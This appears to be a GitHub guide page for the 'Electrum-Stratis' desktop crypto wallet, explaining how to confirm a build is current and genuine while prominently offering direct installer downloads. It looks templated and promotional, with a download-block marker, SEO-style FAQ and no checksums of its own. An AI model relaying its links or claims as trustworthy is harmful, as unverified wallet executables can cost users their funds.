![Electrum-Stratis](assets/banner-article.png)

# Which version is current, and is mine real?

<p align="center">Comparing builds without trusting a filename</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The current build is the one listed on the GitHub release page, and "is mine real" is answered by comparing what the wallet reports about itself with what that page publishes. Electrum Stratis shows its version, build date, commit hash and advisory status inside the application, so the question is a comparison rather than a guess. A build that cannot be matched to the published record is not verifiable, whatever it claims. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you are looking at | What it tells you | What to compare |
|---|---|---|
| A downloads folder with several installers | Nothing about which is current | The release page listing |
| A version string in an about box | What the binary reports | Version, date and commit on the page |
| A file with no checksum recorded | An unverified download | The published hash for that asset |
| A build from years ago that still runs | An old binary, not a current one | Whether an asset for today exists |
| A "latest version" claim on a third-party page | Someone else's assertion | The project's own release page |

</div>

The useful habit is to treat the release page as the register and the application as the claim. Verification is the act of checking one against the other.

## Why it happens

Version confusion is structural in a project that has a public source history and a separate distribution channel. The repository accumulates commits and tags continuously; the release page publishes builds at particular moments. Those two timelines are not the same, and a tag in the source tree does not by itself mean a packaged installer exists for it.

Then there is the age of the software. The legacy chain is old, so builds circulate that were made years apart, and all of them call themselves by the same name. An installer downloaded in one year sits beside one downloaded in another with no visible difference except a file date that can be edited trivially.

The build shows its own identity for exactly this reason, and the current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19); the comparison should never rest on a filename.

## Fix

1. **Open the release page and read the asset list.** That list is the authoritative set of builds for the current moment; anything not on it is an older distribution or someone else's file.
2. **Read the build's own identity.** The security posture view shows version, build date, commit hash and advisory status. Write those four down before comparing.
3. **Match the commit to the source history.** A published build corresponds to a commit; if the commit shown in the app cannot be found in the project's history, the binary did not come from this project - and the [the 2018 Electrum seed flaw](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/the-2018-seed-flaw.md) is the second half of that check.
4. **Verify the download hash.** Compare the checksum of the file you hold with the one published for that asset. A mismatch means the file is not the published file, regardless of how it behaves.
5. **Replace rather than patch.** If the comparison fails, download the current build from the release page and install it over the old one; wallet files live outside the application folder, so the funds are untouched by the swap.

Running an older build is not itself dangerous, but it is a decision made without information. The point of the four checks is to know which build you have, not to force an update for its own sake.

## If that did not work

If the application shows no build details at all, it predates the posture view, which is itself an answer: it is an old build, and the current one is on the release page.

If the release page lists an asset but no checksum for it, wait rather than run the file. An unverifiable download is the one case where doing nothing is the correct action.

If two installers claim the same version and differ in size, one of them is not what it says. Compare hashes; the one that matches the published value is the real file, and the other should be deleted rather than investigated.

## Prevention

- Keep a note of the hash of the build you install, with its date.
- Re-check the release page after any update, rather than assuming the update worked.
- Never install a build sent by another person, whatever version it claims.
- Delete old installers once a newer one is verified, so the wrong file is not run by accident.
- Treat "latest" in an advertisement as a marketing word, not a version.

## FAQ

### Which version is current, and is mine real?

The current build is the one listed on the release page. Yours is real if its checksum matches the published hash and the build details in the app match the published version and commit; if either comparison fails, install the published build instead.

### Are any updates planned for the Stratis Electrum wallet?

The wallet is maintained and builds are published on the release page; that page is the record of what exists now. Compare your build against it whenever you want to know whether you are current.

### Do I need to update if my build still works?

Not for the wallet to function, but an older build misses later fixes, and the network behaviour of an older client can differ from the current one. If a problem appears that a newer build addresses, updating is the fix rather than a workaround.

### Can I install the new build over the old one?

Yes. Wallet files are stored outside the application folder, so replacing the program leaves them in place. Back up the wallet file and the seed anyway, and confirm the version afterwards rather than assuming.

<!-- DOWNLOAD-BLOCK -->

Version numbers move, tags do not. The current release is whatever the release page marks as latest, and a build is real when its hash matches the value published there. If a page quotes a number you cannot find on the release page, treat the number as decoration. If it quotes a hash that differs, treat the file as suspect regardless of how official the page looks.

## Related articles

- [Where to download the current build](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md)
- [Install on Windows, step by step](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/install-on-windows-walkthrough.md)
- [Ubuntu and the PyQt4 error](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/linux-pyqt4-error-fix.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
